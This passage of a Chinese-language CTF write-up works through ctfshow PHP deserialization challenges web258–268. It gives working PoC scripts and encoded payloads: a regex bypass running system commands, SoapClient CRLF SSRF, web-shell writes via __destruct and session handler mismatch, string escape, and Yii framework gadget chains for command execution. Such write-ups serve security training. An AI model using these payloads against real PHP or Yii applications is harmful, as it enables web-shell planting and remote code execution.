    if(!preg_match(&#x27;/[oc]:\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123;
        $user = unserialize($_COOKIE[&#x27;user&#x27;]);
    &#125;
    $user-&gt;login($username,$password);
&#125;</code></pre>
<p>主要是这个过滤的绕过’/[oc]:\d+:/i’</p>
<p>PHP中这个正则的意思是过滤o:数字:和c:数字:</p>
<blockquote>
<p>绕过方法是用+绕过，–&gt;o:+</p>
</blockquote>
<p>其他思路和上一题目一样，用正则直接加，poc如下</p>
<pre><code class="hljs plaintext">&lt;?php
class ctfShowUser&#123;
    public $class = &#x27;backDoor&#x27;;
    public function __construct()&#123;
        $this-&gt;class=new backDoor();
    &#125;
&#125;


class backDoor&#123;
    public $code=&#x27;system(&quot;cat f*&quot;);&#x27;;
&#125;


$h = serialize(new ctfShowUser());
$h = str_replace(&#x27;O:&#x27;,&#x27;O:+&#x27;,$h);

echo urlencode($h);
?&gt;
//O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D</code></pre>
<img src="https://img.hzy2003628.top/image-20230729163748802.png" alt="image-20230729163748802" style="zoom:200%;">
<p>ctfshow{e6d2c3b2-a1f8-4377-ab15-f0c954029225}</p>
<h1 id="web259">web259</h1>
<p>给了flag.php的源码</p>
<pre><code class="hljs plaintext">$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);
array_pop($xff);
$ip = array_pop($xff);


if($ip!==&#x27;127.0.0.1&#x27;)&#123;
   die(&#x27;error&#x27;);
&#125;else&#123;
   $token = $_POST[&#x27;token&#x27;];
   if($token==&#x27;ctfshow&#x27;)&#123;
      file_put_contents(&#x27;flag.txt&#x27;,$flag);
   &#125;
&#125;</code></pre>
<p>index.php的源码是</p>
<pre><code class="hljs plaintext">&lt;?php

highlight_file(__FILE__);


$vip = unserialize($_GET[&#x27;vip&#x27;]);
//vip can get flag one key
$vip-&gt;getFlag();
</code></pre>
<p>要去请求连接，PHP中请求连接的方式如下</p>
<blockquote>
<p>用到了PHP中的内置类soapclient，作用和python中的requests相似</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php
$target = &#x27;http://127.0.0.1/flag.php&#x27;;
$post_string = &#x27;token=ctfshow&#x27;;
$headers = array(
    &#x27;X-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1&#x27;,
    &#x27;UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d&#x27;
);
$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;yn8rt^^Content-Type: application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length: &#x27;.(string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27; =&gt; &quot;aaab&quot;));


$h = serialize($b);
//echo $h;
$h = str_replace(&#x27;^^&#x27;,&quot;\r\n&quot;,$h);
$h = str_replace(&#x27;&amp;&#x27;,&#x27;&amp;&#x27;,$h);
echo urlencode($h);
?&gt;
//O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A235%3A%22yn8rt%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%2C127.0.0.1%2C127.0.0.1%2C127.0.0.1%0D%0AUM_distinctid%3A175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
</code></pre>
<blockquote>
<p>这里估计有的人会报错内置类Class ‘SoapClient’ not found ，我是用的phpstduy，就是要找到php.ini里面的extension把这个内置类的注释去掉</p>
<img src="https://img.hzy2003628.top/image-20230729173807456.png" alt="image-20230729173807456" style="zoom:200%;">
</blockquote>
<p>传参vip进行反序列化，而反序列化调用了getflag这个方法，但是这个方法不存在，所以就会触发魔法函数_call函数，而内置类SoapClient中也有魔法函数_call函数然后访问flag.txt即可得到flag</p>
<img src="https://img.hzy2003628.top/image-20230729174126342.png" alt="image-20230729174126342" style="zoom:200%;">
<p>ctfshow{0505155f-d1eb-4c29-80ec-7ee892ec1016}</p>
<blockquote>
<p>这道题目需要很多前置知识，Y4师傅的博客写的很全，学习完之后再回过头看这道题更容易理解</p>
<p><a href="https://y4tacker.blog.csdn.net/article/details/110521104">(28条消息) 从一道题学习SoapClient与CRLF组合拳_Y4tacker的博客-CSDN博客</a></p>
</blockquote>
<h1 id="web260">web260</h1>
<pre><code class="hljs plaintext">&lt;?php

error_reporting(0);
highlight_file(__FILE__);
include(&#x27;flag.php&#x27;);

if(preg_match(&#x27;/ctfshow_i_love_36D/&#x27;,serialize($_GET[&#x27;ctfshow&#x27;])))&#123;
    echo $flag;
&#125;
</code></pre>
<p>就是构造一个序列化里面包含ctfshow_i_love_36D即可</p>
<p>自己写个就行</p>
<pre><code class="hljs plaintext">&lt;?php

class hzy&#123;
    public $hzy=&#x27;ctfshow_i_love_36D&#x27;;

&#125;

$h = new hzy();
echo serialize($h);
//O:3:&quot;hzy&quot;:1:&#123;s:3:&quot;hzy&quot;;s:18:&quot;ctfshow_i_love_36D&quot;;&#125;</code></pre>
<img src="https://img.hzy2003628.top/image-20230729175256185.png" alt="image-20230729175256185" style="zoom:200%;">
<p>ctfshow{d858eaa9-6cff-4f04-9955-42bd8770af51}</p>
<h1 id="web261">web261</h1>
<pre><code class="hljs plaintext">&lt;?php

highlight_file(__FILE__);

class ctfshowvip&#123;
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p)&#123;
        $this-&gt;username=$u;
        $this-&gt;password=$p;
    &#125;
    public function __wakeup()&#123;  //绕---serialize之后立马会调用
        if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123;
            die(&#x27;error&#x27;);
        &#125;
    &#125;
    public function __invoke()&#123;
        eval($this-&gt;code);     //door  //当尝试以调用函数的方式调用一个对象时
    &#125;

    public function __sleep()&#123;    //对象serialize之前调用
        $this-&gt;username=&#x27;&#x27;;
        $this-&gt;password=&#x27;&#x27;;
    &#125;
    public function __unserialize($data)&#123;
        $this-&gt;username=$data[&#x27;username&#x27;];
        $this-&gt;password=$data[&#x27;password&#x27;];
        $this-&gt;code = $this-&gt;username.$this-&gt;password;
    &#125;
    public function __destruct()&#123;
        if($this-&gt;code==0x36d)&#123;
            file_put_contents($this-&gt;username, $this-&gt;password);   //door
        &#125;
    &#125;
&#125;

unserialize($_GET[&#x27;vip&#x27;]);</code></pre>
<blockquote>
<p>前置知识</p>
<p>当一个类中同时有__unserialize和__wakeup这俩魔术方法的时候只会调用unserialize方法，wakeup直接忽略</p>
</blockquote>
<p>当传入vip进行反序列化的时候就会调用这个unserialize魔术函数，door命令没办法用，但是destruct函数可以写文件，转变思路，看如何满足</p>
<blockquote>
<p>1.code=0x36d</p>
<p>2.code=username+password</p>
</blockquote>
<p>在弱比较情况下877和877.php是相等的，所以username写文件，password写内容就行</p>
<p>poc如下</p>
<pre><code class="hljs plaintext">&lt;?php



class ctfshowvip&#123;
    public $username=&#x27;&#x27;;
    public $password=&#x27;&#x27;;
    public $code=&#x27;0x36d&#x27;;


    public function __construct()&#123;
        $this-&gt;username=&#x27;877.php&#x27;;
        $this-&gt;password=&#x27;&lt;?php eval($_POST[1]);&#x27;;
    &#125;

&#125;

$h = new ctfshowvip();
echo serialize($h);
//O:10:&quot;ctfshowvip&quot;:3:&#123;s:8:&quot;username&quot;;s:7:&quot;877.php&quot;;s:8:&quot;password&quot;;s:22:&quot;&lt;?php eval($_POST[1]);&quot;;s:4:&quot;code&quot;;s:5:&quot;0x36d&quot;;&#125;</code></pre>
<img src="https://img.hzy2003628.top/image-20230729184128929.png" alt="image-20230729184128929" style="zoom:200%;">
<p>ctfshow{3820ca3e-502e-46ae-aa9f-b553043b35b6}</p>
<h1 id="web262">web262</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
class message&#123;
    public $from;
    public $msg;
    public $to;
    public $token=&#x27;user&#x27;;
    public function __construct($f,$m,$t)&#123;
        $this-&gt;from = $f;
        $this-&gt;msg = $m;
        $this-&gt;to = $t;
    &#125;
&#125;

$f = $_GET[&#x27;f&#x27;];
$m = $_GET[&#x27;m&#x27;];
$t = $_GET[&#x27;t&#x27;];

if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;
    $msg = new message($f,$m,$t);
    $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));
    setcookie(&#x27;msg&#x27;,base64_encode($umsg));
    echo &#x27;Your message has been sent&#x27;;
&#125;

highlight_file(__FILE__);</code></pre>
<p>给了提示还有个message.php</p>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 15:13:03
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 15:17:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
highlight_file(__FILE__);
include(&#x27;flag.php&#x27;);

class message&#123;
    public $from;
    public $msg;
    public $to;
    public $token=&#x27;user&#x27;;
    public function __construct($f,$m,$t)&#123;
        $this-&gt;from = $f;
        $this-&gt;msg = $m;
        $this-&gt;to = $t;
    &#125;
&#125;

if(isset($_COOKIE[&#x27;msg&#x27;]))&#123;
    $msg = unserialize(base64_decode($_COOKIE[&#x27;msg&#x27;]));
    if($msg-&gt;token==&#x27;admin&#x27;)&#123;
        echo $flag;
    &#125;
&#125;</code></pre>
<p>左思右想，我发现index.php的代码给的有点多余啊，我message.php就存在可控点，抱着试试的心理我就写poc了</p>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
include(&#x27;flag.php&#x27;);

class message&#123;
    public $from;
    public $msg;
    public $to;
    public $token=&#x27;admin&#x27;;

&#125;
$h = new message();
echo base64_encode(serialize($h));
//Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO047czozOiJtc2ciO047czoyOiJ0byI7TjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</code></pre>
<p>然后就出了</p>
<img src="https://img.hzy2003628.top/image-20230729185227899.png" alt="image-20230729185227899" style="zoom:200%;">
<p>的确，查了其他师傅写的WP发现这是非预期了，我的方法就是直接传序列化token为admin成立，然后他就会输出flag</p>
<p>预期解应该是反序列化字符串逃逸，从index.php下手</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
class message&#123;
    public $from ;
    public $msg;
    public $to;
    public $token=&#x27;admin&#x27;;
    public function __construct($f,$m,$t)&#123;
        $this-&gt;from = $f;
        $this-&gt;msg = $m;
        $this-&gt;to = $t;

    &#125;
&#125;
$h = new message(1,1,1);
echo serialize($h);
//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;i:1;s:3:&quot;msg&quot;;i:1;s:2:&quot;to&quot;;i:1;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre>
<p>将这个poc传进去之后访问message.php会发现有cookie，base解码一下是这个结果</p>
<pre><code class="hljs plaintext">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;1&quot;;s:2:&quot;to&quot;;s:84:&quot;O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;i:1;s:3:&quot;msg&quot;;i:1;s:2:&quot;to&quot;;i:1;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code></pre>
<p>仔细看一下源码里面，有个正则替换，利用这个正则替换可以造成字符逃逸</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
class message&#123;
    public $from ;
    public $msg;
    public $to;
    public $token=&#x27;admin&#x27;;
    public function __construct($f,$m,$t)&#123;
        $this-&gt;from = $f;
        $this-&gt;msg = $m;
        $this-&gt;to = $t;

    &#125;
&#125;
$h = new message(1,1,fuck);
$h1 = new message(1,1,fuck);
echo serialize($h);
//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;i:1;s:3:&quot;msg&quot;;i:1;s:2:&quot;to&quot;;s:4:&quot;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;
echo &quot;\n&quot;;
echo str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($h1));
//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;i:1;s:3:&quot;msg&quot;;i:1;s:2:&quot;to&quot;;s:4:&quot;loveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre>
<blockquote>
<p>O:7:“message”:4:{s:4:“from”;i:1;s:3:“msg”;i:1;s:2:“to”;s:4:“fuck”;s:5:“token”;s:5:“admin”;}</p>
<p>O:7:“message”:4:{s:4:“from”;i:1;s:3:“msg”;i:1;s:2:“to”;s:4:“loveU”;s:5:“token”;s:5:“admin”;}</p>
</blockquote>
<p>会发现虽然fuck的确替换成loveU了，但是序列化的长度还是4，所以在反序列化的时候他就只会截取to参数的前四个字符，最后一个字符就逃逸了，所以每当有一个fuck就会逃逸出来一个字符</p>
<p>目的是让序列化的token为admin，那么我们就是要逃逸长度内容为&quot;;s:5:“token”;s:5:“admin”;}的字符，让其成功闭合，将后面逃逸的字符舍弃掉，如下图这个时候admin后面那个回括号就逃逸了，所以逃逸31个字符</p>
<img src="https://img.hzy2003628.top/image-20230731180343432.png" alt="image-20230731180343432" style="zoom:200%;">
<pre><code class="hljs plaintext">&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;是需要逃逸出来的内容，27位，所以需要27个fuck进行逃逸</code></pre>
<p>poc如下</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
class message&#123;
    public $from ;
    public $msg;
    public $to;
    public $token=&#x27;admin&#x27;;
    public function __construct($f,$m,$t)&#123;
        $this-&gt;from = $f;
        $this-&gt;msg = $m;
        $this-&gt;to = $t;

    &#125;
&#125;
$h = new message(1,1,&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;);
echo serialize($h);
//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;i:1;s:3:&quot;msg&quot;;i:1;s:2:&quot;to&quot;;i:1;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;

echo &quot;\n&quot;;

//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;i:1;s:3:&quot;msg&quot;;i:1;s:2:&quot;to&quot;;s:135:&quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;
</code></pre>
<p>传入fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:“token”;s:5:“admin”;}&quot;;s:5:“token”;s:5:“admin”;}访问message.php即可得到flag</p>
<p>传进去的内容是下面这个</p>
<pre><code class="hljs plaintext">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;1&quot;;s:2:&quot;to&quot;;s:162:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code></pre>
<p>因为逃逸了27个字符，所以后面的;s:5:“token”;s:5:“admin”;}&quot;;s:5:“token”;s:4:“user”;}直接被忽略了，因为}直接把前面的闭合了</p>
<img src="https://img.hzy2003628.top/image-20230731181202787.png" alt="image-20230731181202787" style="zoom:200%;">
<p>ctfshow{06e43cd4-540b-4946-a8e1-34ac93d9a741}</p>
<h1 id="web263">web263</h1>
<p>题目进来是一个登录框</p>
<img src="https://img.hzy2003628.top/image-20230731181627504.png" alt="image-20230731181627504" style="zoom:200%;">
<p>扫目录发现源码泄露www.zip</p>
<p>一眼顶针，session反序列化</p>
<img src="https://img.hzy2003628.top/image-20230731181948874.png" alt="image-20230731181948874" style="zoom:200%;">
<p>还防SQL注入了</p>
<img src="https://img.hzy2003628.top/image-20230731182153906.png" alt="image-20230731182153906" style="zoom:200%;">
<p>调用session_start时，PHP内置处理器会对session进行反序列化和序列化操作</p>
<blockquote>
<p>常见的对数据进行序列化和反序列化的处理器</p>
<p>1.php_binary    键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值<br>
2.php                 键名+竖线（|）+经过serialize()函数处理过的值<br>
3.php_serialize  经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</p>
</blockquote>
<p>三种情况生成的session格式如下</p>
<p>php_binary</p>
<img src="https://img.hzy2003628.top/image-20230731211312370.png" alt="image-20230731211312370" style="zoom:200%;">
<p>php</p>
<img src="https://img.hzy2003628.top/image-20230731210943420.png" alt="image-20230731210943420" style="zoom:200%;">
<p>php_serialize</p>
<img src="https://img.hzy2003628.top/image-20230731211354266.png" alt="image-20230731211354266" style="zoom:200%;">
<p>想看题目用了哪个处理器就查找ini_set的session.serialize_handler的参数，显然这道题目用的是php,如果找不到的话php版本低于5.5.4就是默认php处理器，高于5.5.4就是php_serialize 【一般情况下是这样嗷，我的是7.4.3，但是默认的处理器居然是php】</p>
<img src="https://img.hzy2003628.top/image-20230731182718038.png" alt="image-20230731182718038" style="zoom:200%;">
<p>但是会发现index.php中并没指定哪一个处理器，而php版本又是7+，也就是说明index.php的处理器用的是php_serialize ，和inc.php用的处理器是不一样的，也就是这种差异导致了session反序列化漏洞</p>
<img src="https://img.hzy2003628.top/image-20230731183048295.png" alt="image-20230731183048295" style="zoom:200%;">
<p>同时inc.php中username和password这俩参数是可控的</p>
<img src="https://img.hzy2003628.top/image-20230731183259452.png" alt="image-20230731183259452" style="zoom:200%;">
<p>同时仔细观察会发现index.php的limit拼错了，这就导致这个限制是没用的，入口也就找到了，就是cookie的limit参数</p>
<img src="https://img.hzy2003628.top/image-20230731183411977.png" alt="image-20230731183411977" style="zoom:200%;">
<p>既然这样，username文件名，password写内容，存session</p>
<p>这个是用php处理器得到的结果</p>
<pre><code class="hljs plaintext">&lt;?php
session_start();
class User&#123;
    public $username;
    public $password;
    public $status;
    function __construct($username,$password)&#123;
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    &#125;
    function setStatus($s)&#123;
        $this-&gt;status=$s;
    &#125;
/*    function __destruct()&#123;
        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));
    &#125;*/
&#125;

$h = new User(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);
$_SESSION[&#x27;u&#x27;] = $h;</code></pre>
<pre><code class="hljs plaintext">u|O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:24:&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;s:6:&quot;status&quot;;N;&#125;</code></pre>
<p>用php_serialize处理器得到的结果如下</p>
<pre><code class="hljs plaintext">&lt;?php
session_start();
ini_set(&quot;session.serialize.handle&quot;,&quot;php_serialize&quot;);
class User&#123;
    public $username;
    public $password;
    public $status;
    function __construct($username,$password)&#123;
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    &#125;
    function setStatus($s)&#123;
        $this-&gt;status=$s;
    &#125;
/*    function __destruct()&#123;
        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));
    &#125;*/
&#125;

$h = new User(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);
$_SESSION[&#x27;u&#x27;] = $h;</code></pre>
<pre><code class="hljs plaintext">a:1:&#123;s:1:&quot;u&quot;;O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:24:&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;s:6:&quot;status&quot;;N;&#125;&#125;</code></pre>
<p>对比一下区别，对于inc.php，传进去的|前面的会被当作键值，后面的进行反序列化，所以总而言之就是在序列化之前加一个|，然后base编码即可，poc如下</p>
<pre><code class="hljs plaintext">&lt;?php
ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);
session_start();

class User&#123;
    public $username;
    public $password;
    public $status;
    function __construct($username,$password)&#123;
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    &#125;
    function setStatus($s)&#123;
        $this-&gt;status=$s;
    &#125;
/*    function __destruct()&#123;
        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));
    &#125;*/
&#125;

$h = new User(&#x27;2.php&#x27;,&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;);
/*$_SESSION[&#x27;u&#x27;] = $h;*/

$poc = base64_encode(&#x27;|&#x27;.serialize($h));
echo $poc;
//fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIyLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQ==</code></pre>
<p>cookie传参之后刷新一下，然后登录触发check.php即可写入文件</p>
<img src="https://img.hzy2003628.top/image-20230731215708628.png" alt="image-20230731215708628" style="zoom:200%;">
<img src="https://img.hzy2003628.top/image-20230731215828469.png" alt="image-20230731215828469" style="zoom:200%;">
<p>ctfshow{e1d8b50b-1fe8-49ac-9ab8-dabdefb99f3a}</p>
<h1 id="web264">web264</h1>
<p>262的plus版本，考察的还是字符串逃逸，同解</p>
<h1 id="web265">web265</h1>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
include(&#x27;flag.php&#x27;);
highlight_file(__FILE__);
class ctfshowAdmin&#123;
    public $token;
    public $password;

    public function __construct($t,$p)&#123;
        $this-&gt;token=$t;
        $this-&gt;password = $p;
    &#125;
    public function login()&#123;
        return $this-&gt;token===$this-&gt;password;
    &#125;
&#125;

$ctfshow = unserialize($_GET[&#x27;ctfshow&#x27;]);
$ctfshow-&gt;token=md5(mt_rand());

if($ctfshow-&gt;login())&#123;
    echo $flag;
&#125;</code></pre>
<p>给token随便赋值，然后password指向token的地址，这样不论token如何改变，password都能跟着变，也就是会一直保持相等，poc如下</p>
<blockquote>
<p>&amp;在PHP中就是引用指向地址的意思，指针</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
include(&#x27;flag.php&#x27;);
highlight_file(__FILE__);
class ctfshowAdmin&#123;
    public $token;
    public $password;

    public function __construct()&#123;
        $this-&gt;token=&#x27;a&#x27;;
        $this-&gt;password = &amp;$this-&gt;token;
    &#125;
    public function login()&#123;
        return $this-&gt;token===$this-&gt;password;
    &#125;
&#125;

$h = new ctfshowAdmin();
echo serialize($h);
//O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;s:1:&quot;a&quot;;s:8:&quot;password&quot;;R:2;&#125;</code></pre>
<p><img src="https://img.hzy2003628.top/image-20230731221737122.png" alt="image-20230731221737122"></p>
<h1 id="web266">web266</h1>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
include(&#x27;flag.php&#x27;);
$cs = file_get_contents(&#x27;php://input&#x27;);


class ctfshow&#123;
    public $username=&#x27;xxxxxx&#x27;;
    public $password=&#x27;xxxxxx&#x27;;
    public function __construct($u,$p)&#123;
        $this-&gt;username=$u;
        $this-&gt;password=$p;
    &#125;
    public function login()&#123;
        return $this-&gt;username===$this-&gt;password;
    &#125;
    public function __toString()&#123;
        return $this-&gt;username;
    &#125;
    public function __destruct()&#123;
        global $flag;
        echo $flag;
    &#125;
&#125;
$ctfshowo=@unserialize($cs);
if(preg_match(&#x27;/ctfshow/&#x27;, $cs))&#123;
    throw new Exception(&quot;Error $ctfshowo&quot;,1);
&#125;
</code></pre>
<p>这道题目的就是执行析构函数，但是如何去触发，当序列化的字符串有ctfshow就会抛出异常，这个时候就用大小写绕过即可</p>
<blockquote>
<p>在PHP中区分大小写的是变量名，数组索引以及常量名</p>
<p>不区分大小写的是函数名，方法名，类名，魔法常量，FALSE,TRUE,NULL</p>
</blockquote>
<p>还有一个点就是在源码里貌似没看出来传参点，其实不然，仔细观察，cs变量已经赋值了php://input，所以这个时候只需要将exp传报文内容即可</p>
<img src="https://img.hzy2003628.top/image-20230731223426835.png" alt="image-20230731223426835" style="zoom:200%;">
<p>ctfshow{7d5926a1-cc69-4f3b-ba6d-077c1403c2bd}</p>
<h1 id="web267">web267</h1>
<img src="https://img.hzy2003628.top/image-20230731223751117.png" alt="image-20230731223751117" style="zoom:200%;">
<p>弱口令admin/admin直接登录，发现是Yii框架</p>
<img src="https://img.hzy2003628.top/image-20230731223729920.png" alt="image-20230731223729920" style="zoom:200%;">
<p>源码有提示</p>
<img src="https://img.hzy2003628.top/image-20230731223900028.png" alt="image-20230731223900028" style="zoom:200%;">
<p>尝试删除拼接，看到了反序列化入口</p>
<img src="https://img.hzy2003628.top/image-20230731224045300.png" alt="image-20230731224045300" style="zoom:200%;">
<p>直接在网上找个链子打</p>
<pre><code class="hljs plaintext">&lt;?php

namespace yii\rest&#123;
    class IndexAction&#123;
        public $checkAccess;
        public $id;
        public function __construct()&#123;
            $this-&gt;checkAccess = &#x27;phpinfo&#x27;;
            $this-&gt;id = &#x27;1&#x27;;            //命令执行
        &#125;
    &#125;
&#125;
namespace Faker &#123;

    use yii\rest\IndexAction;

    class Generator
    &#123;
        protected $formatters;

        public function __construct()
        &#123;
            $this-&gt;formatters[&#x27;close&#x27;] = [new IndexAction(), &#x27;run&#x27;];
        &#125;
    &#125;
&#125;
namespace yii\db&#123;

    use Faker\Generator;

    class BatchQueryResult&#123;
        private $_dataReader;
        public function __construct()
        &#123;
            $this-&gt;_dataReader=new Generator();
        &#125;
    &#125;
&#125;
namespace&#123;

    use yii\db\BatchQueryResult;

    echo base64_encode(serialize(new BatchQueryResult()));
&#125;

//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo3OiJwaHBpbmZvIjtzOjI6ImlkIjtzOjE6IjEiO31pOjE7czozOiJydW4iO319fX0</code></pre>
<img src="https://img.hzy2003628.top/image-20230731224754595.png" alt="image-20230731224754595" style="zoom:200%;">
<p>system应该是被ban了，用passthru</p>
<img src="https://img.hzy2003628.top/image-20230731225516167.png" alt="image-20230731225516167" style="zoom:200%;">
<p>ctfshow{76df7712-2eae-4822-8c4c-40a27352c483}</p>
<h1 id="web268">web268</h1>
<p>换个poc继续打，刷题的先这样写了，还会抽时间跟链子</p>
<pre><code class="hljs plaintext">&lt;?php

namespace yii\rest&#123;
    class IndexAction&#123;
        public $checkAccess;
        public $id;
        public function __construct()&#123;
            $this-&gt;checkAccess = &#x27;exec&#x27;;
            $this-&gt;id = &#x27;cp /f* flag.txt&#x27;;
        &#125;
    &#125;
&#125;
namespace Faker &#123;

    use yii\rest\IndexAction;

    class Generator
    &#123;
        protected $formatters;

        public function __construct()
        &#123;
            $this-&gt;formatters[&#x27;isRunning&#x27;] = [new IndexAction(), &#x27;run&#x27;];
        &#125;
    &#125;
&#125;
namespace Codeception\Extension&#123;

    use Faker\Generator;

    class RunProcess
    &#123;
        private $processes = [];
        public function __construct()&#123;
